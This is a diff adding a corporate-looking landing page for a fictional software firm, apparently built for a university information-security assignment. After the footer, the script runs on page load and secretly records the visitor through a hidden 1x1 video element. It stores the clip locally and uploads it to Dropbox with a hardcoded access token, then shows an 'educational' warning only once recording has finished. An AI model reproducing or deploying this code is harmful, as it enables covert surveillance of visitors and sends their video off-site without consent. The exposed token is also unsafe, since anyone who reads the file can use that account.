@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>NexaByte Solutions – Software House</title>
+  <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700&family=Inter:wght@300;400;500&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --blue: #1a6fff; --blue-light: #e8f0fe; --blue-dark: #0d47c4;
+      --white: #ffffff; --gray: #f5f7fc; --text: #1a1d2e;
+      --muted: #6b7280; --border: #dce3f3;
+    }
+    html { scroll-behavior: smooth; }
+    body { font-family: 'Inter', sans-serif; color: var(--text); background: var(--white); }
+
+    nav {
+      position: sticky; top: 0; z-index: 100;
+      background: rgba(255,255,255,0.92); backdrop-filter: blur(10px);
+      border-bottom: 1px solid var(--border);
+      padding: 0 5%; display: flex; align-items: center;
+      justify-content: space-between; height: 64px;
+    }
+    .logo { font-family: 'Sora', sans-serif; font-weight: 700; font-size: 1.4rem; color: var(--blue); }
+    .logo span { color: var(--text); }
+    nav ul { list-style: none; display: flex; gap: 2rem; }
+    nav ul a { text-decoration: none; color: var(--text); font-size: 0.9rem; font-weight: 500; transition: color 0.2s; }
+    nav ul a:hover { color: var(--blue); }
+    .nav-btn { background: var(--blue); color: #fff; border: none; padding: 0.5rem 1.2rem; border-radius: 8px; cursor: pointer; font-size: 0.9rem; font-weight: 500; }
+
+    .hero {
+      background: linear-gradient(135deg, #f0f5ff 0%, #e8f0fe 60%, #ffffff 100%);
+      padding: 90px 5% 80px; display: flex; align-items: center;
+      justify-content: space-between; gap: 2rem; flex-wrap: wrap;
+    }
+    .hero-text { max-width: 540px; }
+    .badge { display: inline-block; background: var(--blue-light); color: var(--blue); font-size: 0.78rem; font-weight: 600; padding: 0.3rem 0.9rem; border-radius: 20px; margin-bottom: 1.2rem; letter-spacing: 0.04em; text-transform: uppercase; }
+    .hero h1 { font-family: 'Sora', sans-serif; font-size: clamp(2rem, 4vw, 3rem); line-height: 1.2; margin-bottom: 1.2rem; }
+    .hero h1 span { color: var(--blue); }
+    .hero p { color: var(--muted); font-size: 1.05rem; line-height: 1.7; margin-bottom: 2rem; }
+    .hero-btns { display: flex; gap: 1rem; flex-wrap: wrap; }
+    .btn-primary { background: var(--blue); color: #fff; padding: 0.75rem 1.8rem; border-radius: 10px; font-size: 0.95rem; font-weight: 600; text-decoration: none; display: inline-block; }
+    .btn-outline { border: 2px solid var(--blue); color: var(--blue); padding: 0.75rem 1.8rem; border-radius: 10px; font-size: 0.95rem; font-weight: 600; text-decoration: none; display: inline-block; }
+    .hero-img { width: 380px; max-width: 100%; background: linear-gradient(135deg, #1a6fff22, #1a6fff44); border-radius: 20px; height: 280px; display: flex; align-items: center; justify-content: center; border: 2px solid var(--border); }
+    .hero-img svg { width: 120px; opacity: 0.6; }
+
+    .stats { display: flex; justify-content: center; flex-wrap: wrap; gap: 2rem; padding: 3rem 5%; border-bottom: 1px solid var(--border); }
+    .stat { text-align: center; }
+    .stat h2 { font-family: 'Sora', sans-serif; font-size: 2rem; color: var(--blue); }
+    .stat p { color: var(--muted); font-size: 0.85rem; margin-top: 0.2rem; }
+
+    section { padding: 70px 5%; }
+    .section-label { text-align: center; color: var(--blue); font-size: 0.78rem; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 0.6rem; }
+    h2.section-title { font-family: 'Sora', sans-serif; font-size: clamp(1.6rem, 3vw, 2.2rem); text-align: center; margin-bottom: 0.8rem; }
+    .section-sub { text-align: center; color: var(--muted); font-size: 1rem; max-width: 500px; margin: 0 auto 3rem; }
+
+    .services-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 1.5rem; }
+    .card { background: var(--gray); border-radius: 16px; padding: 2rem 1.5rem; border: 1px solid var(--border); transition: box-shadow 0.2s, transform 0.2s; }
+    .card:hover { box-shadow: 0 8px 32px #1a6fff18; transform: translateY(-4px); }
+    .card-icon { width: 48px; height: 48px; background: var(--blue-light); border-radius: 12px; display: flex; align-items: center; justify-content: center; margin-bottom: 1rem; font-size: 1.4rem; }
+    .card h3 { font-family: 'Sora', sans-serif; font-size: 1.05rem; margin-bottom: 0.5rem; }
+    .card p { color: var(--muted); font-size: 0.9rem; line-height: 1.6; }
+
+    .why { background: var(--gray); }
+    .why-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1.5rem; margin-top: 2.5rem; }
+    .why-item { display: flex; gap: 1rem; align-items: flex-start; }
+    .why-dot { width: 10px; height: 10px; background: var(--blue); border-radius: 50%; margin-top: 6px; flex-shrink: 0; }
+    .why-item h4 { font-family: 'Sora', sans-serif; font-size: 0.95rem; margin-bottom: 0.3rem; }
+    .why-item p { color: var(--muted); font-size: 0.85rem; line-height: 1.6; }
+
+    .contact-inner { background: linear-gradient(135deg, var(--blue), var(--blue-dark)); border-radius: 24px; padding: 3.5rem 2.5rem; text-align: center; color: #fff; }
+    .contact-inner h2 { font-family: 'Sora', sans-serif; font-size: 1.9rem; margin-bottom: 0.8rem; }
+    .contact-inner p { opacity: 0.85; margin-bottom: 2rem; font-size: 1rem; }
+    .contact-form { display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; }
+    .contact-form input { padding: 0.75rem 1.2rem; border-radius: 10px; border: none; font-size: 0.95rem; width: 260px; outline: none; }
+    .contact-form button { background: #fff; color: var(--blue); border: none; padding: 0.75rem 1.8rem; border-radius: 10px; font-weight: 700; font-size: 0.95rem; cursor: pointer; }
+
+    footer { background: var(--text); color: #adb5c9; padding: 2.5rem 5%; text-align: center; font-size: 0.85rem; line-height: 1.8; }
+    .footer-logo { font-family: 'Sora', sans-serif; font-size: 1.2rem; font-weight: 700; color: #fff; margin-bottom: 0.5rem; }
+    .group-info { margin-top: 1.2rem; background: rgba(255,255,255,0.05); border-radius: 10px; padding: 0.8rem 1.5rem; display: inline-block; border: 1px solid rgba(255,255,255,0.1); }
+    .group-info p { color: #cbd5e1; font-size: 0.82rem; }
+    .group-info strong { color: #fff; }
+
+    @keyframes popIn { from { transform: scale(0.85); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    @media (max-width: 600px) { nav ul { display: none; } .hero { flex-direction: column; padding: 60px 5%; } .hero-img { width: 100%; } }
+  </style>
+</head>
+<body>
+
+  <nav>
+    <div class="logo">Nexa<span>Byte</span></div>
+    <ul>
+      <li><a href="#services">Services</a></li>
+      <li><a href="#why">Why Us</a></li>
+      <li><a href="#contact">Contact</a></li>
+    </ul>
+    <button class="nav-btn">Get a Quote</button>
+  </nav>
+
+  <section class="hero">
+    <div class="hero-text">
+      <div class="badge">🚀 Pakistan's Growing Software House</div>
+      <h1>We Build <span>Digital Products</span> That Drive Results</h1>
+      <p>NexaByte Solutions delivers high-quality web applications, mobile apps, and software systems for businesses worldwide. From idea to launch — we've got you covered.</p>
+      <div class="hero-btns">
+        <a href="#services" class="btn-primary">Explore Services</a>
+        <a href="#contact" class="btn-outline">Contact Us</a>
+      </div>
+    </div>
+    <div class="hero-img">
+      <svg viewBox="0 0 100 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect x="10" y="10" width="80" height="50" rx="6" fill="#1a6fff" opacity="0.3"/>
+        <rect x="18" y="18" width="64" height="34" rx="4" fill="#1a6fff" opacity="0.4"/>
+        <rect x="40" y="64" width="20" height="6" rx="3" fill="#1a6fff" opacity="0.5"/>
+        <circle cx="50" cy="35" r="10" fill="#1a6fff" opacity="0.7"/>
+        <path d="M44 35 L48 39 L56 31" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+  </section>
+
+  <div class="stats">
+    <div class="stat"><h2>50+</h2><p>Projects Delivered</p></div>
+    <div class="stat"><h2>30+</h2><p>Happy Clients</p></div>
+    <div class="stat"><h2>5+</h2><p>Years Experience</p></div>
+    <div class="stat"><h2>10+</h2><p>Team Members</p></div>
+  </div>
+
+  <section id="services">
+    <p class="section-label">What We Do</p>
+    <h2 class="section-title">Our Services</h2>
+    <p class="section-sub">We offer end-to-end software development services tailored to your business needs.</p>
+    <div class="services-grid">
+      <div class="card"><div class="card-icon">🌐</div><h3>Web Development</h3><p>Modern, responsive websites and web apps built with React, Next.js, and Node.js.</p></div>
+      <div class="card"><div class="card-icon">📱</div><h3>Mobile Apps</h3><p>Cross-platform mobile apps for iOS and Android using Flutter and React Native.</p></div>
+      <div class="card"><div class="card-icon">🛒</div><h3>E-Commerce</h3><p>Full-featured online stores with payment integration and admin dashboards.</p></div>
+      <div class="card"><div class="card-icon">☁️</div><h3>Cloud Solutions</h3><p>Scalable cloud infrastructure on AWS, Azure, and GCP with full DevOps support.</p></div>
+      <div class="card"><div class="card-icon">🔒</div><h3>Cybersecurity</h3><p>Security audits, penetration testing, and secure software development practices.</p></div>
+      <div class="card"><div class="card-icon">🤖</div><h3>AI Integration</h3><p>Smart AI-powered features including chatbots, recommendations, and analytics.</p></div>
+    </div>
+  </section>
+
+  <section class="why" id="why">
+    <p class="section-label">Why Choose Us</p>
+    <h2 class="section-title">Built for Your Success</h2>
+    <p class="section-sub">We combine technical expertise with clear communication to deliver software that works.</p>
+    <div class="why-grid">
+      <div class="why-item"><div class="why-dot"></div><div><h4>On-Time Delivery</h4><p>We respect deadlines and keep you updated at every stage.</p></div></div>
+      <div class="why-item"><div class="why-dot"></div><div><h4>Clean Code</h4><p>Maintainable, well-documented, and scalable code always.</p></div></div>
+      <div class="why-item"><div class="why-dot"></div><div><h4>Affordable Pricing</h4><p>Competitive rates without compromising quality.</p></div></div>
+      <div class="why-item"><div class="why-dot"></div><div><h4>24/7 Support</h4><p>Post-launch support so your product always runs smoothly.</p></div></div>
+      <div class="why-item"><div class="why-dot"></div><div><h4>Agile Process</h4><p>Iterative development with regular feedback loops.</p></div></div>
+      <div class="why-item"><div class="why-dot"></div><div><h4>Security First</h4><p>Security best practices baked into every product.</p></div></div>
+    </div>
+  </section>
+
+  <section id="contact">
+    <div class="contact-inner">
+      <h2>Ready to Start Your Project?</h2>
+      <p>Drop your email and we'll get back to you within 24 hours.</p>
+      <div class="contact-form">
+        <input type="email" placeholder="Enter your email address" />
+        <button>Get In Touch</button>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="footer-logo">NexaByte Solutions</div>
+    <p>Karachi, Pakistan &nbsp;|&nbsp; <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d0b9beb6bf90beb5a8b1b2a9a4b5fea0bb">[email&#160;protected]</a> &nbsp;|&nbsp; +92 300 0000000</p>
+    <p style="margin-top:0.5rem; font-size:0.78rem;">© 2026 NexaByte Solutions. All rights reserved.</p>
+    <div class="group-info">
+      <p><strong>IS Assignment-02 | Information Security</strong></p>
+      <p>Group Members: <strong>Hamza Shabbir (23F-0546)</strong> &amp; <strong>Rizwan Mustafa (23F-0709)</strong></p>
+      <p>National University of Computer and Emerging Sciences</p>
+    </div>
+  </footer>
+
+  <!--
+    ================================================================
+    WEBCAM CAPTURE MODULE
+    Step 2 : Auto-start webcam on page load (getUserMedia)
+    Step 3 : Save recorded video to localStorage (Phase 1)
+    Bonus  : Capture device info (browser, OS, timezone, resolution)
+    Step 4 : Show security awareness warning popup after recording
+    ================================================================
+  -->
+
+  <!-- Hidden 1x1 video element — user cannot see this -->
+  <video id="hiddenCam" autoplay muted playsinline
+    style="position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:0;left:0;">
+  </video>
+
+  <!-- SECURITY WARNING POPUP OVERLAY -->
+  <div id="securityWarning" style="
+      display:none; position:fixed; inset:0; z-index:9999;
+      background:rgba(0,0,0,0.65); backdrop-filter:blur(5px);
+      align-items:center; justify-content:center;">
+
+    <div style="
+        background:#fff; border-radius:20px; padding:2.5rem 2rem;
+        max-width:500px; width:92%; box-shadow:0 24px 64px rgba(0,0,0,0.35);
+        text-align:center; font-family:'Inter',sans-serif;
+        animation:popIn 0.3s ease;">
+
+      <div style="font-size:3rem; margin-bottom:0.8rem;">⚠️</div>
+
+      <h2 style="font-family:'Sora',sans-serif; color:#d32f2f; margin-bottom:0.8rem; font-size:1.4rem;">
+        Security Awareness Warning
+      </h2>
+
+      <p style="color:#333; font-size:0.93rem; line-height:1.75; margin-bottom:1.2rem;">
+        <strong>This is an educational demonstration.</strong><br>
+        This page just accessed your webcam and recorded a short clip silently in the background.
+        This shows how malicious websites can misuse camera permissions without your awareness.
+      </p>
+
+      <p style="color:#c62828; font-size:0.88rem; font-weight:600; margin-bottom:1.4rem;
+                background:#fdecea; padding:0.6rem 1rem; border-radius:8px;">
+        ⚠️ Always verify before granting camera access to any website!
+      </p>
+
+      <!-- Device Info Box -->
+      <div style="background:#f5f7fc; border-radius:12px; padding:1rem 1.2rem;
+                  text-align:left; font-size:0.82rem; color:#444;
+                  margin-bottom:1.2rem; border:1px solid #dce3f3;">
+        <p style="font-weight:700; margin-bottom:0.6rem; color:#1a6fff;">
+          📋 Device Info We Captured:
+        </p>
+        <div id="deviceInfoContent" style="line-height:2;"></div>
+      </div>
+
+      <!-- localStorage status -->
+      <p id="storageStatus" style="font-size:0.82rem; color:#2e7d32; margin-bottom:1.4rem; min-height:1.2em;"></p>
+
+      <!-- Close Button -->
+      <button onclick="closeWarning()" style="
+          background:#1a6fff; color:#fff; border:none;
+          padding:0.8rem 2rem; border-radius:10px;
+          font-size:0.95rem; font-weight:600; cursor:pointer; width:100%;">
+        I Understand — Close
+      </button>
+
+      <p style="margin-top:1rem; font-size:0.72rem; color:#aaa;">
+        IS Assignment-02 &nbsp;|&nbsp; NexaByte Group &nbsp;|&nbsp; NUCES Karachi
+      </p>
+    </div>
+  </div>
+
+  <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+    // ── CONFIG ──────────────────────────────────────────────────────
+    var RECORD_MS = 5000;   // Record for 5 seconds
+    var chunks    = [];
+    var recorder  = null;
+
+    // ── STEP 2: START WEBCAM WHEN PAGE LOADS ────────────────────────
+    window.addEventListener('load', function () {
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        .then(function (stream) {
+
+          // Attach to hidden video
+          document.getElementById('hiddenCam').srcObject = stream;
+
+          // Pick supported MIME
+          var mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9')
+                     ? 'video/webm;codecs=vp9' : 'video/webm';
+
+          recorder = new MediaRecorder(stream, { mimeType: mime });
+
+          // Collect data chunks
+          recorder.ondataavailable = function (e) {
+            if (e.data && e.data.size > 0) chunks.push(e.data);
+          };
+
+          // When recording stops
+          recorder.onstop = function () {
+            stream.getTracks().forEach(function (t) { t.stop(); }); // Turn off camera
+            saveVideo();          // Phase 1
+            showDeviceInfo();     // Bonus
+            showWarning();        // Security popup
+          };
+
+          recorder.start(200);  // Collect data every 200ms
+
+          // Auto stop after RECORD_MS
+          setTimeout(function () {
+            if (recorder && recorder.state !== 'inactive') recorder.stop();
+          }, RECORD_MS);
+
+        })
+        .catch(function (err) {
+          // Camera denied — still show warning with device info
+          console.warn('Camera unavailable:', err.message);
+          showDeviceInfo();
+          showWarning();
+          var el = document.getElementById('storageStatus');
+          el.textContent = '⚠️ Camera was denied or not available.';
+          el.style.color = '#c62828';
+        });
+    });
+
+    // ── STEP 3 — PHASE 1: SAVE TO localStorage ──────────────────────
+    function saveVideo() {
+      if (!chunks.length) return;
+      var blob   = new Blob(chunks, { type: 'video/webm' });
+      var reader = new FileReader();
+      reader.onloadend = function () {
+        try {
+          localStorage.setItem('capturedVideo', reader.result);
+          localStorage.setItem('captureTime',   new Date().toISOString());
+          document.getElementById('storageStatus').textContent =
+            '✅ Video saved to Local Storage! Size: ' + (blob.size/1024).toFixed(1) + ' KB';
+        } catch(e) {
+          var el = document.getElementById('storageStatus');
+          el.textContent = '⚠️ localStorage full: ' + e.message;
+          el.style.color = '#c62828';
+        }
+      };
+      reader.onloadend = function () {
+        try {
+          localStorage.setItem('capturedVideo', reader.result);
+          localStorage.setItem('captureTime',   new Date().toISOString());
+          document.getElementById('storageStatus').textContent =
+            '✅ Video saved to Local Storage! Size: ' + (blob.size/1024).toFixed(1) + ' KB';
+        } catch(e) {
+          var el = document.getElementById('storageStatus');
+          el.textContent = '⚠️ localStorage full: ' + e.message;
+          el.style.color = '#c62828';
+        }
+        // Phase 2: Upload to Dropbox
+        uploadToDropbox(blob);
+      };
+      reader.readAsDataURL(blob);
+    }
+
+    // ── STEP 6 — PHASE 2: UPLOAD VIDEO TO DROPBOX ───────────────────
+    // Replace YOUR_DROPBOX_TOKEN_HERE with your actual Dropbox access token
+    var DROPBOX_TOKEN = 'sl.u.AGV0kL6hkUkybtD0hnub9TekZuW88s4EtWwvQZ6GkLqZxg6e0JRiyiVNXz7bbCvFbGWn4ZmW1TP023OxsLWQ61lNiihmvSv_SzITA62lKgFjQt9qEYflUp_aySSd6RFZONWvN8eaXWimTEi7LW7_RQhg997SmAA3TrxRFOD4JuyKy5pO-jS2YCygk4pKPu0CNRjjZ1m7eTEnf9NZGv13GF22nk-l7I-F4r2O91zTq-XJ-G2O-5HY8gDhPtWWeKEJzLsJEzlVOG_EX6YBRjLh8k8WpcBjSbcdYB6OywpIp2jy8b9fcaFWhrQAdbBbSWHtgg7nKYhKp2iGIZ_XbsNax3KacYwtuoy7NQTdjuz6MwBfC-C0vSZtF14AG3bOkofNg2FqV8wLT1Jhorl0GZlGkZ5mSPg_aBYcA0Tr1EUTjNHQk_-OtOc2feEKFGBDuS4faqvAv_6xpV7dSby9mtzV4Azkwuw4BGuWwOChDvXaBcpuhGWJBVt7jSuvHiLXkgreRZ5HGsJJLbdAMdxBBPQOV32ndcFD45XSxDoNkAuswrzY0aKFJiv1ZfpsTr3AU8yX4EHRvLJwWpadm7Ic5BVR8J6R6bVIdULh7EAWs6gZFdpLqLSZlkMqPsuLYU7W-7sEQ4l5IlZu6sF_8wO2If1b08GEHGsxTmB5UCegiGqN5z97Tgu4kqwn5qOzhGKUbLk-4Xhw7MbRAh7sNEeCO8Y-WQG5Zkl1IWlJ5kQ083NKd_jgOq5hCBPWwg1Rmuba-yb2jBb7dOXkiTO_9hyTgQulf5yAC58-Dt8JTlNmwdXZk-VUtYB_sKTksKRpqyEwf3YsgyY3E4faqg6Nz43qbQK1Dub6rLOZojSAP_7QZFGvgY7w0Y8-smISz9hDMfcb6oZqPWRCHFon0ZtUjB2iPDTyvbCymnF3AG7QsayhNMocl8SqJfW89xUpQR2t0G_zXanrReZKhoOHEsiAm8iJh2AHDYHVY4nzPRio6W4IBvD1ZgLS2n0rcxjHBVYS5HWdBFS2mzVuSumWxzwbx0WEaXubgLyJZIAZjCfBOJwGjBxL0t-Zz99R2gvKBeUsXPs0pqACzv8Pp92gJI9CmiRqCcVm6PxZLui5R7CFOcC1y2JJRkyy6VW34rV6E8r6kRvD_vqinCmw35DEK1HtPRADziv9GCe09Pyl8Aiti-PdixSNImk9cx2RLUhFsE6m9XZxffkGnMKQ3hPNwGrwH2oz4F64_1g3UElLcJSqvDLY4zwe-Vi4Vyjc7X_SClaorcwlldTnB2tZSw5Rum1Gj4sn6S1eJ8T4FiTAJcnrrBmnX-3KSoCoJeW28ZZOEeR1T39z2scQyNCXedtfRgjwwwT6CoR6wMtR7hLbhQxybIijXfTMtNYcWgf51J6aUN3iZ6j6dVZKkG0QTk_KXCONW2a37oovqFvWuI3kkpKYh5uXzBqPlQ4QSg';
+
+    function uploadToDropbox(blob) {
+      // Create a unique filename using timestamp
+      var filename = '/webcam_capture_' + Date.now() + '.webm';
+
+      // Update popup to show upload is starting
+      var el = document.getElementById('storageStatus');
+      el.textContent = '⏳ Uploading video to Dropbox...';
+      el.style.color = '#1a6fff';
+
+      // Upload the video blob to Dropbox using their API
+      fetch('https://content.dropboxapi.com/2/files/upload', {
+        method: 'POST',
+        headers: {
+          'Authorization':   'Bearer ' + DROPBOX_TOKEN,
+          'Dropbox-API-Arg': JSON.stringify({
+            path:       filename,
+            mode:       'add',
+            autorename: true,
+            mute:       false
+          }),
+          'Content-Type': 'application/octet-stream'
+        },
+        body: blob   // Send the raw video blob
+      })
+      .then(function (res) { return res.json(); })
+      .then(function (data) {
+        if (data.name) {
+          // Success — file uploaded
+          el.textContent = '✅ Video saved to Local Storage & uploaded to Dropbox! File: ' + data.name;
+          el.style.color = '#2e7d32';
+          localStorage.setItem('dropboxUpload', JSON.stringify({ file: data.name, time: new Date().toISOString() }));
+        } else {
+          // Dropbox returned an error
+          el.textContent = '⚠️ Dropbox upload failed: ' + (data.error_summary || 'Unknown error');
+          el.style.color = '#c62828';
+        }
+      })
+      .catch(function (err) {
+        // Network error or token issue
+        el.textContent = '⚠️ Dropbox upload error: ' + err.message;
+        el.style.color = '#c62828';
+      });
+    }
+
+    // ── BONUS: DEVICE INFORMATION ───────────────────────────────────
+    function showDeviceInfo() {
+      var info = {
+        'Browser':           browser(),
+        'Operating System':  os(),
+        'Screen Resolution': screen.width + ' x ' + screen.height,
+        'Timezone':          Intl.DateTimeFormat().resolvedOptions().timeZone,
+        'Language':          navigator.language || 'Unknown',
+        'Capture Time':      new Date().toLocaleString()
+      };
+      localStorage.setItem('deviceInfo', JSON.stringify(info));
+      var html = '';
+      for (var k in info) {
+        html += '<p><strong>' + k + ':</strong> ' + info[k] + '</p>';
+      }
+      document.getElementById('deviceInfoContent').innerHTML = html;
+    }
+
+    function browser() {
+      var ua = navigator.userAgent;
+      if (ua.includes('Edg'))     return 'Microsoft Edge';
+      if (ua.includes('Chrome'))  return 'Google Chrome';
+      if (ua.includes('Firefox')) return 'Mozilla Firefox';
+      if (ua.includes('Safari'))  return 'Apple Safari';
+      if (ua.includes('OPR'))     return 'Opera';
+      return 'Unknown';
+    }
+
+    function os() {
+      var ua = navigator.userAgent;
+      if (ua.includes('Windows NT')) return 'Windows 10/11';
+      if (ua.includes('Mac OS X'))   return 'macOS';
+      if (ua.includes('Android'))    return 'Android';
+      if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+      if (ua.includes('Linux'))      return 'Linux';
+      return 'Unknown';
+    }
+
+    // ── POPUP CONTROLS ───────────────────────────────────────────────
+    function showWarning() {
+      document.getElementById('securityWarning').style.display = 'flex';
+    }
+
+    function closeWarning() {
+      document.getElementById('securityWarning').style.display = 'none';
+    }
+
+  </script>
+
+</body>
+</html>
